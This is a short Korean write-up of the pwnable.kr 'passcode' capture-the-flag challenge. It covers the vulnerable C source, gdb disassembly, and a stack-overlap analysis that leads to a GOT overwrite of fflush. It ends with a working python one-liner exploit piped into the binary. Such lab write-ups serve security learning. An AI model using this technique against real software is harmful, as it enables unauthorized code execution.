```bash
passcode@pwnable:~$ checksec passcode
[*] '/home/passcode/passcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```C
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

login 함수에서 scanf에 &가 없다.

```bash
(gdb) disassemble welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave
   0x08048664 <+91>:    ret
End of assembler dump.
```
-0x70(0xffeea618)부터 입력받는다.

```bash
(gdb) disassemble login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
```
passcode1은 -0x10(0xffeea678), passcode2는 -0xc(0xffeea67c) 자리에 있다.
0x60 = 96, 4자리가 겹친다.

GOT Overwrite
flush의 got 주소 0x804a004 를 welcome에서 입력해놓고
passcode1 에서 0x080485e3=134514147 으로 옮겨주면 된다.

```bash
(python -c 'print "A" * 96 + "\x04\xa0\x04\x08" + "134514147"') | ./passcode
```
